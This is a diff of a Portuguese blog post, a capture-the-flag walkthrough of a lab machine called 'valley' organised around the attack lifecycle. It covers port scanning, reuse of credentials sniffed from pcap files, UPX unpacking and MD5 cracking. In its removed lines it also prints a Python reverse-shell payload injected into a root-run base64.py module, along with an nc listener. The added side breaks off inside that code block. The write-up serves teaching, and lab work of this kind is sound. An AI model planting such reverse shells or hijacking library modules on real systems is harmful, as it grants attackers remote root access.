+O primeiro ponto é que essa pessoa costuma reusar as credenciais, a única credencial que foi capturada é a <strong>siemDev</strong> e isso significa que a mesma serve para a porta ftp dessa aplicação. No entanto, não se sabe qual seria a porta ftp, apesar da nota setar para essa possível resposta por não estar em seu &ldquo;valor&rdquo; usual, para isso o <strong>nmap</strong> se faz necessário para tentar localizá-la e também verificar as outras portas disponíveis.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v -p- alvo
+</span></span></code></pre></div><p><img alt="nmap" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eet5qmuf6iqoggx47nne.png">
+A  porta ftp é justamente a porta <strong>37370</strong>, informada para o dev e que está referenciada na nota da rota <strong>/devNotes37370.txt</strong> . Com isso, apenas se faz necessário nesse momento realizar a conexão e adentrar a próxima etapa do ciclo do ataque.</p>
+<h3 id="initial-compromise-e-establish-foothold">Initial Compromise e Establish Foothold</h3>
+<hr>
+<p>A partir do momento em que o invasor realiza esse tipo de ação e consegue o feito de obter acesso ao ftp, já temos ali um <strong>initial compromise</strong> (comprometimento inicial) da aplicação, ainda que não seja o objetivo ideal é  justamente a partir desse princípio que terá a possibilidade de realizar uma elevação de privilégios por exemplo. Quando se pensa na etapa do <strong>establish foothold</strong> (estabelecimento do ponto de apoio) é necessário algo que mantenha esse acesso. Nessa máquina em questão, a manutenção desse acesso se deu pela captura de pacotes de tráfego da rede, realizando a filtragem e análise desses pacotes com <strong>Wireshark</strong> ou <strong>tcpdump</strong>, em busca de credenciais que possam preservar esse acesso.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp <span class="o">[</span>ip<span class="o">]</span> <span class="o">[</span>port<span class="o">]</span>
+</span></span><span class="line"><span class="cl">ftp 00.00.000.00 <span class="m">37370</span>
+</span></span></code></pre></div><p><img alt="acesso ao ftp" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/80ytv2tast0wrsd1ecrd.png">
+Agora a questão é o que se tem ali e o que pode ser verificado? algo que possa ir contribuindo para o ciclo de ataque do intruso? Exatamente os pacotes de captura de tráfego, na porta ftp.</p>
+<p><img alt="pacotes de captura de tráfego" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/53qjko0xmha10cs70frg.png">
+E o que foi feito no terminal acima? Primeiramente, a conexão com ftp, colocando as credenciais que foram adquiridas, usando o comando ls para verificar os arquivos ali presentes e por fim o comando mget *  para capturar esses arquivos do ftp para a própria máquina, podendo assim realizar uma analisa melhor desses pacotes. Caso tenha interesse, nesse site possui informações sobre os <a href="https://www.cs.colostate.edu/helpdocs/ftp.html">comandos básicos do ftp</a>.</p>
+<h4 id="wireshark">Wireshark</h4>
+<hr>
+<pre tabindex="0"><code class="language-wireshark" data-lang="wireshark">(http.request or tls.handshake.type eq 1) and !(ssdp)   
 
 (http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0)) and !(ssdp)
 
 (http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0) or dns) and !(ssdp)
-</code></pre><p>De forma bem breve, não explicando de maneira mais aprofundada sobre o assunto, a ideia aqui são as filtragens para visualizar melhor os arquivos capturados na porta ftp, que foi retirado de um <a href=https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/>site indicado</a> por um grande colega. O <strong>(http.request or tls.handshake.type eq 1) and !(ssdp)</strong> realiza a filtragem quanto a requisições de web (HTTP), e início de conexões seguras (TLS), mas ignorando os pacotes de dispositivos SSDP, <strong>(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0)) and !(ssdp)</strong> realiza a filtragem incluindo os mesmos do primeiro, mas com a diferença de incluir conexões TCP que estão tentando ser abertas (os pacotes SYN), mas sem o ACK. Quanto ao <strong>(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0) or dns) and !(ssdp)</strong> inclui pacotes que envolvam o dns. Com isso temos a objetividade do que vamos analisar no tráfego e poder visualizar melhor a conversa entre os dispositivos de uma rede.</p><p>No arquivo siemFTP.pcapng:</p><p><img alt="arquivo siemFTP.pcapng" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rob8zzao0rjdhmbwi2jv.png></p><p>siemHTTP2.pcapng:</p><p><img alt="arquivo siemHTTP2.pcapng" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dgxo5quvbk1b58iit3dw.png></p><p>Foram obtidos dois conteúdos interessantes, o primeiro é o anonymous, que é um login público e que quando um servidor ftp permite esse <strong>acesso anônimo</strong>, o usuário pode conectar sem precisar de um nome de usuário ou senha, mas infelizmente essa possibilidade não foi concretizada, pois esse acesso anônimo foi desabilitado.</p><p><img alt=anonymous src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w46522gzu6fc15shrle2.png>
-O segundo conteúdo é usuário <strong>valleyDev</strong> e senha <strong>ph0t0s1234</strong>, no entanto se você tentar acessá-lo na dinâmica de porta ftp irá receber um erro, em virtude de um mecanismo de segurança que impede esse acesso a este determinado usuário. A questão que fica é será que não existe outro lugar para efetuar esse login? Se voltarmos a varredura de portas, lembraremos que a porta 22 do ssh está aberta.</p><p><img alt="Porta 22 ssh" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5ce0nkigd1zf6xogped8.png>
-Por se tratar de uma porta ssh, o mesmo necessita de um login e senha. É através dessa porta que será feita a primeira escalada de privilégio, com as credenciais obtidas através da análise dos pacotes anteriores.</p><h3 id=escalate-privileges>Escalate Privileges</h3><hr><p>O <strong>escalate privileges</strong> (elevação de privilégios) se deu por todo um processo de coleta de informações, com isso tendo as filtragens corretas e que fossem possíveis esse comprometimento maior da aplicação. A ideia a partir daqui é conseguir chegar até a raiz e no primeiro contato com a porta ssh, já teremos a primeira flag, no arquivo <strong>user.txt</strong>, com a ajuda do usuário valleyDev.</p><p><img alt="ssh valleyDev" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/82oxrv38qa4xt3hhngvo.jpeg>
-Após esse primeiro contato poderia se pensar que a missão estaria finalizada para um possível invasor, porém a ideia é pensar no quanto é possível extrair das informações ali presentes e como efetivar essa escalada de privilégios até chegar no &ldquo;super Admin&rdquo; e ter acesso total.</p><h3 id=internal-recon>Internal Recon</h3><hr><p>Antes de pensar em outro processo de elevação desses privilégios, é importante ressaltar sobre a varredura das portas feita anteriormente e em como será a dinâmica nesse contexto, além de análise de usuários, etc.</p><p><img alt="Porta 22 ssh" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5pftokkahy0937xhkmmx.png>
-O serviço ssh dessa aplicação usa como sistema operacional o Linux.</p><p>Durante esse processo de <strong>initial recon</strong> (reconhecimento interno) e funcionamento do serviço se pode pensar sobre a questão dos usuários presentes no serviço e um bastante curioso é o usuário valley, que se tornará a ponte até o o root.</p><p><img alt=valleyDev@valley src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63jf2r5p1lwu80w39dtg.png>
-Existem dois pontos importantes dessa análise, o primeiro é o arquivo executável valleyAuthenticator, que foi compactado usando o upx. Esse é o ponto de partida para conseguir um usuário com um pouco mais de permissão.</p><p><img alt="ELF 64 bits" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2sez9js3liq84uf3qo5m.png></p><p><img alt=UPX src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qrenm7dje1fgph1e75vr.png>
-O segundo é o diretório <strong>/usr/lib/python3.8/</strong>, nele contém bibliotecas e módulos python. A partir dele podemos pensar em usar um reverse shell e tentar acesso ao root, mas para isso precisamos verificar um usuário que possa dar permissões adicionais que o usuário valleyDev não pode oferecer, para pelo menos editar algum arquivo .py vinculado a um super usuário que dê esse acesso final a raiz.</p><p><img alt="arquivo base64.py" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uf9d0nuum6yajh9bf2vt.png></p><p><img alt="base64.py permission denied" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tef91pnk5nqc8sgqg68e.png></p><h3 id=move-laterally-e-maintain-presence>Move laterally e Maintain Presence</h3><hr><p>A ideia do <strong>move laterally</strong> (movimentação lateral ) e <strong>maintain presence</strong> (manter presença) se dá pelo objetivo de conseguir um novo usuário que terá as permissões necessárias para chegar no objetivo final e esse processo se inicia na decodificação do valleyAuthenticator. A movimentação parte da exploração e comprometimento de outros sistemas na mesma rede ou infraestrutura, além do sistema atual que já possui o acesso, porém nesse contexto da máquina, o fato de obter um novo usuário que tenha certos privilégios acaba sendo esse movimento lateral, pois o mesmo terá recursos que o usuário valley não possuía. Enquanto a etapa de manter presença é justamente garantir esse acesso que se tem ao sistema comprometido e manter essa continuidade de ataque e até mesmo retorno ao sistema sem ter suas atividades finalizadas ou possibilidade de ser detectado.</p><p>Nesse caso precisamos conseguir trazer o arquivo <strong>valleyAuthenticator</strong> para a própria máquina e realizar a análise com a ferramenta <strong>upx</strong> e visualizar melhor o que será entregue e se existe algum tipo de informação que possa contribuir nessa etapa.
-Para realizar esse processo a utilização do comando pytho3 -m http.server porta, se faz necessário para que seja iniciado um servidor web bem simples com python e consiga capturar arquivos para própria máquina que está no serviço ssh.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>Terminal</span> <span class=mi>1</span>
-</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=o>-</span><span class=n>m</span> <span class=n>http</span><span class=o>.</span><span class=n>server</span> <span class=p>[</span><span class=n>porta</span> <span class=n>de</span> <span class=n>sua</span> <span class=n>escolha</span><span class=p>]</span>
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>Terminal</span> <span class=mi>2</span>
-</span></span><span class=line><span class=cl><span class=n>wget</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>ip</span><span class=p>:</span><span class=n>porta</span><span class=o>/</span><span class=n>valleyAUthenticator</span>
-</span></span></code></pre></div><p><img alt="ptyon3 -m http.server" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0tfl06r5bkj188u9u463.jpeg></p><p><img alt=wget src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/184dhltwxc1pgfrd26ho.png>
-Depois de baixar o arquivo diretamente para a máquina é necessário decodificá-lo primeiro usando a ferramenta upx e após isso ler com o comando strings.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>upx -d arquivo
-</span></span><span class=line><span class=cl>strings arquivo
-</span></span></code></pre></div><p><img alt="upx -d" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hijwnxyqdyashmy6wxa4.png>
-Após isso, se tem a busca de informações através do autenticador da valley, quanto a um usuário, algo codificado ou encriptado e que possa ser efetivado o encontro do valor original. A informação necessária se encontra no início de uma autenticação que ficou registrada nesse arquivo, e usando um hash analyzer, pode ser obtida a informação de que é uma hash MD5. Por fim, apenas é realizada a descoberta do valor original das duas hashes, que são a senha e o usuário.</p><p><img alt=hashes src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qp64ycd8mxmcftqhpnsv.png></p><p><img alt="hash analyzer" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/27ucp7fa66piekfh214u.png></p><p><img alt="decode md5" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bqcmirhzjofoeej34f5r.png></p><p><img alt="decode md5" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nj5gwykc48a8z010387j.png>
+</code></pre><p>De forma bem breve, não explicando de maneira mais aprofundada sobre o assunto, a ideia aqui são as filtragens para visualizar melhor os arquivos capturados na porta ftp, que foi retirado de um <a href="https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/">site indicado</a> por um grande colega. O  <strong>(http.request or tls.handshake.type eq 1) and !(ssdp)</strong> realiza a filtragem quanto a requisições de web (HTTP), e início de conexões seguras (TLS), mas ignorando os pacotes de dispositivos SSDP,  <strong>(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0)) and !(ssdp)</strong> realiza a filtragem incluindo os mesmos do primeiro, mas com a diferença de  incluir conexões TCP que estão tentando ser abertas (os pacotes SYN), mas sem o ACK. Quanto ao  <strong>(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0) or dns) and !(ssdp)</strong> inclui pacotes que envolvam o dns. Com isso temos a objetividade do que vamos analisar no tráfego e poder visualizar melhor a conversa entre os dispositivos de uma rede.</p>
+<p>No arquivo siemFTP.pcapng:</p>
+<p><img alt="arquivo siemFTP.pcapng" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rob8zzao0rjdhmbwi2jv.png"></p>
+<p>siemHTTP2.pcapng:</p>
+<p><img alt="arquivo siemHTTP2.pcapng" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dgxo5quvbk1b58iit3dw.png"></p>
+<p>Foram obtidos dois conteúdos interessantes, o primeiro é o anonymous, que é um login público e que quando um servidor ftp permite esse <strong>acesso anônimo</strong>, o usuário pode conectar sem precisar de um nome de usuário ou senha, mas infelizmente essa possibilidade não foi concretizada, pois esse acesso anônimo foi desabilitado.</p>
+<p><img alt="anonymous" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/w46522gzu6fc15shrle2.png">
+O segundo conteúdo é usuário <strong>valleyDev</strong> e senha <strong>ph0t0s1234</strong>, no entanto se você tentar acessá-lo na dinâmica de porta ftp irá receber um erro, em virtude de um mecanismo de segurança que impede esse acesso a este determinado usuário. A questão que fica é será  que não existe outro lugar para efetuar esse login? Se voltarmos a varredura de portas, lembraremos que a porta 22 do ssh está aberta.</p>
+<p><img alt="Porta 22 ssh" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5ce0nkigd1zf6xogped8.png">
+Por se tratar de  uma porta ssh, o mesmo necessita de um login e senha. É através dessa porta  que será feita a primeira escalada de privilégio, com as credenciais obtidas através da análise dos pacotes anteriores.</p>
+<h3 id="escalate-privileges">Escalate Privileges</h3>
+<hr>
+<p>O <strong>escalate privileges</strong> (elevação de privilégios) se deu por todo um processo de coleta de informações, com isso tendo as filtragens corretas e que fossem possíveis esse comprometimento maior da aplicação. A ideia a partir daqui é conseguir chegar até a raiz e no primeiro contato com a porta ssh, já teremos a primeira flag, no arquivo <strong>user.txt</strong>, com a ajuda do usuário valleyDev.</p>
+<p><img alt="ssh valleyDev" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/82oxrv38qa4xt3hhngvo.jpeg">
+Após esse primeiro contato poderia se pensar que a missão estaria finalizada para um possível invasor, porém a ideia é pensar no quanto é possível extrair das informações ali presentes e como efetivar essa escalada de privilégios até chegar no &ldquo;super Admin&rdquo; e ter acesso total.</p>
+<h3 id="internal-recon">Internal Recon</h3>
+<hr>
+<p>Antes de pensar em outro processo de elevação desses privilégios, é importante ressaltar sobre a varredura das portas feita anteriormente e em como será a dinâmica nesse contexto, além de análise de usuários, etc.</p>
+<p><img alt="Porta 22 ssh" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5pftokkahy0937xhkmmx.png">
+O serviço ssh dessa aplicação usa como sistema operacional o Linux.</p>
+<p>Durante esse processo de <strong>initial recon</strong> (reconhecimento interno) e funcionamento do serviço se pode pensar sobre a questão dos usuários presentes no serviço e um bastante curioso é o usuário valley, que se tornará a ponte até o o root.</p>
+<p><img alt="valleyDev@valley" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63jf2r5p1lwu80w39dtg.png">
+Existem dois pontos importantes dessa análise, o primeiro é o arquivo executável valleyAuthenticator, que foi compactado usando o upx. Esse é o ponto de partida para conseguir um usuário com um pouco mais de permissão.</p>
+<p><img alt="ELF 64 bits" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2sez9js3liq84uf3qo5m.png"></p>
+<p><img alt="UPX" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qrenm7dje1fgph1e75vr.png">
+O segundo é o diretório <strong>/usr/lib/python3.8/</strong>, nele contém bibliotecas e módulos python. A partir dele podemos pensar em usar um reverse shell e tentar acesso ao root, mas para isso precisamos verificar um usuário que possa dar permissões adicionais que o usuário valleyDev não pode oferecer, para pelo menos editar algum arquivo .py vinculado a um super usuário que dê esse acesso final a raiz.</p>
+<p><img alt="arquivo base64.py" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uf9d0nuum6yajh9bf2vt.png"></p>
+<p><img alt="base64.py permission denied" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tef91pnk5nqc8sgqg68e.png"></p>
+<h3 id="move-laterally-e-maintain-presence">Move laterally e Maintain Presence</h3>
+<hr>
+<p>A ideia do <strong>move laterally</strong> (movimentação lateral ) e <strong>maintain presence</strong> (manter presença) se dá pelo objetivo de conseguir um novo usuário que terá as permissões necessárias para chegar no objetivo final e esse processo se inicia na decodificação do valleyAuthenticator. A movimentação parte da exploração e comprometimento de outros sistemas na mesma rede ou infraestrutura, além do sistema atual que já possui o acesso, porém nesse contexto da máquina, o fato de obter um novo usuário que tenha certos privilégios acaba sendo esse movimento lateral, pois o mesmo terá recursos que o usuário valley não possuía. Enquanto a etapa de manter presença é justamente garantir esse acesso que se tem ao sistema comprometido e manter essa continuidade de ataque e até mesmo retorno ao sistema sem ter suas atividades finalizadas ou possibilidade de ser detectado.</p>
+<p>Nesse caso precisamos conseguir trazer o arquivo <strong>valleyAuthenticator</strong> para a própria máquina e realizar a análise com a ferramenta <strong>upx</strong> e  visualizar melhor o que será entregue e se existe algum tipo de informação que possa contribuir nessa etapa.
+Para realizar esse processo a utilização do comando pytho3 -m http.server porta, se faz necessário para que seja iniciado um servidor web bem simples com python e consiga capturar arquivos para própria máquina que está no serviço ssh.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Terminal</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="p">[</span><span class="n">porta</span> <span class="n">de</span> <span class="n">sua</span> <span class="n">escolha</span><span class="p">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Terminal</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="p">:</span><span class="n">porta</span><span class="o">/</span><span class="n">valleyAUthenticator</span>
+</span></span></code></pre></div><p><img alt="ptyon3 -m http.server" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0tfl06r5bkj188u9u463.jpeg"></p>
+<p><img alt="wget" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/184dhltwxc1pgfrd26ho.png">
+Depois de baixar o arquivo diretamente para a máquina é necessário decodificá-lo primeiro usando a ferramenta upx e após isso ler com o comando strings.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">upx -d arquivo
+</span></span><span class="line"><span class="cl">strings arquivo
+</span></span></code></pre></div><p><img alt="upx -d" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hijwnxyqdyashmy6wxa4.png">
+Após isso, se tem a busca de informações através do autenticador da valley, quanto a um usuário, algo codificado ou encriptado e que possa ser efetivado o encontro do valor original.  A informação necessária se encontra no início de uma autenticação que ficou registrada nesse arquivo, e usando um hash analyzer, pode ser obtida a informação de que é uma hash MD5. Por fim, apenas é realizada a descoberta do valor original das duas hashes, que são a senha e o usuário.</p>
+<p><img alt="hashes" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qp64ycd8mxmcftqhpnsv.png"></p>
+<p><img alt="hash analyzer" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/27ucp7fa66piekfh214u.png"></p>
+<p><img alt="decode md5" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bqcmirhzjofoeej34f5r.png"></p>
+<p><img alt="decode md5" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nj5gwykc48a8z010387j.png">
 Com sucesso foi obtido o usuário com permissões um pouco melhores do que a do valleyDev, o usuário <strong>valley</strong> e mais uma <strong>elevação de privilégios</strong>.
-<img alt=ssh src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oj65g07taz3jxygy4fk4.png></p><p>O objetivo maior agora é conseguir chegar até a raiz e acessar a última flag. Ao observar novamente o diretório do <strong>python3.8</strong> em <strong>/usr/lib/python3.8</strong>, o arquivo <strong>base64.py</strong> do usuário valleyAdmin se encontra mais acessível. Com o usuário valley, esse arquivo pode ser modificado e usado como ponte para realizar a última <strong>escalada de privilégios</strong>.
-<img alt=base64.py src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v0llk0fiaied7v134xgf.png></p><p>O movimento a ser feito é fazer com que o módulo base64.py ao ser solicitado terá um <a href=https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python>payload de reverse shell</a>, que ao ser executado na primeira fileira de código enviará uma conexão de entrada em uma porta específica e retornará no terminal essa conexão, com uma interface de linha de comando (terminal) e com isso a interação com o sistema operacional da aplicação web.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>nano</span> <span class=n>base64</span><span class=o>.</span><span class=n>py</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/python3  </span>
-</span></span><span class=line><span class=cl>  
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>  
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>  
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>os</span> <span class=kn>import</span> <span class=n>dup2</span>  
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>run</span>  
-</span></span><span class=line><span class=cl>  
-</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>  
-</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;ip&#34;</span><span class=p>,</span> <span class=mi>3000</span><span class=p>))</span>  
-</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span> <span class=mi>0</span><span class=p>)</span>  
-</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>1</span><span class=p>)</span>  
-</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>2</span><span class=p>)</span>  
-</span></span><span class=line><span class=cl><span class=n>run</span><span class=p>([</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s2>&#34;-i&#34;</span><span class=p>])</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>------</span> <span class=n>restante</span> <span class=n>do</span> <span class=n>código</span> <span class=o>------</span>
-</span></span></code></pre></div><p><img alt="base64.py com payload reverse shell" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/73zanj2nczqmpzhkmj0l.jpeg></p><h3 id=final-escalation-privileges-e-complete-mission>Final Escalation Privileges e Complete Mission</h3><hr><p>A elevação de privilégios desse contexto se finaliza assim que o o netcat escuta na porta 3000 e recebe a conexão de entrada feita a partir do arquivo base64.py.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>3000</span>
-</span></span></code></pre></div><p><img alt=root src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jpbowthykp15zbqm069u.jpeg>
-o arquivo final se encontra no root.txt e ao utilizar o whoami, o mesmo confirma estar na raíz da aplicação. Portanto, a missão e objetivo final foi completado pelo invasor. Entretanto, parte da perspectiva da máquina valley, mas aqui poderia ser novamente mais um ciclo de ataques e busca por dados sensíveis, qualquer informação que seja pertinente. Este é o fim, por causa das flags, mas seria o fim de um ataque real? Como agir nesse contexto, em quais etapas seria interessante visualizar soluções e formas de conter esse ataque maior e mais severo? É claro que esse contexto é bem mais simples e não tão complexo quanto em um cenário real.</p><h3 id=considerações-finais>Considerações finais</h3><hr><p>A máquina valley trouxe base para o entendimento do modelo <strong>attack lifecycle</strong>, que caso seja de interesse do leitor, tem um pouco do livro <strong>A arte da guerra</strong> de <strong>Sun Tzu</strong>. A informação é um fator crucial e muito importante, assim como no campo de batalha, não seria diferente em um possível ataque cibernético, no princípio desde o reconhecimento inicial, construindo todas as informações que poderiam ser extraídas naquele contexto sobre o alvo, o comprometimento a partir de uma credencial exposta em uma rota e sendo o ponta pé inicial de invasão e o estabelecimento da conexão, onde será mantido o acesso àquele servidor. A elevação de privilégios, essa etapa voltou em diversos momentos para que culminasse no objetivo final, ou seja, o invasor não pensa em um só ataque e pronto, não é algo unilateral, parte também da perspectiva de possibilidades que terá a seu favor. Então, as questões ali em conjunto com os privilégios, como o reconhecimento pós uma &ldquo;melhora&rdquo; no acesso, a movimentação lateral de tentar mais um usuário que dê a possibilidade de injetar um payload de reverse shell em um módulo python, a manutenção para firmar essa presença nessa aplicação e mais uma escalada desses privilégios até o encontro da ultima flag na raiz.
-Logo, assim como a água não ser constante, <strong>Heráclito</strong> de <strong>Éfeso</strong> diz que você não toma banho duas vezes no mesmo rio, porque esse mesmo rio já passou, se encontra no passado e você já não é o mesmo de ontem. É importante pensar nessa construção de probabilidades de um atacante, de construir e entender o contexto daquilo, porque partir dessa análise mais aberta contribui para uma forma mais clara e objetiva de estacar ou conter um ciberataque. O modelo é um norte, não sendo tudo ali elaborado exatamente daquele jeito, mas pode ser uma referência para guiar nesse processo.</p><h3 id=referências-bibliográficas>Referências bibliográficas</h3><hr><ul><li><strong>TZU, Sun.</strong> <em>A arte da guerra</em>. Tradução de André da Silva Bueno. 2. ed. São Paulo: Editora UNESP, 2009.</li><li><strong>MESSIER, Ric.</strong> <em>Certified Ethical Hacker (CEH) v11: Study Guide</em>. 2. ed. Sybex, 2021.</li></ul></div></article></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/obtuosa target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
-</a><a href=/index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2025 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script async src=http://localhost:32807/js/main.js></script></body></html>
+<img alt="ssh" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oj65g07taz3jxygy4fk4.png"></p>
+<p>O objetivo maior agora é conseguir chegar até a raiz e acessar a última flag. Ao observar novamente o diretório do <strong>python3.8</strong> em <strong>/usr/lib/python3.8</strong>,  o arquivo <strong>base64.py</strong> do usuário valleyAdmin se encontra mais acessível. Com o usuário valley, esse arquivo pode ser modificado e usado como ponte para realizar a última <strong>escalada de privilégios</strong>.
+<img alt="base64.py" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v0llk0fiaied7v134xgf.png"></p>
+<p>O movimento a ser feito é fazer com que o módulo base64.py ao ser solicitado terá um <a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python">payload de reverse shell</a>, que ao ser executado na primeira fileira de código enviará uma conexão de entrada em uma porta específica e retornará no terminal essa conexão, com uma interface de linha de comando (terminal) e com isso a interação com o sistema operacional da aplicação web.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nano</span> <span class="n">base64</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python3  </span>
+</span></span><span class="line"><span class="cl">  
